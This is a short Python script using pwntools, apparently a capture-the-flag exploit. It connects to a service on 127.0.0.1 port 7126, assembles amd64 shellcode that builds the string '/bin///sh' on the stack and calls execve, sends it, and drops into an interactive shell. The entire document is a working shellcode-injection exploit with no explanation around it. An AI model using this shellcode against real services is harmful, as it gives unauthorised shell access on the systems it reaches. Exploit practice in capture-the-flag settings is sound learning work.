from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('127.0.0.1', 7126)

a = asm("""
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
        """)

#embed()
raw_input('@')
r.send(a)

r.interactive()
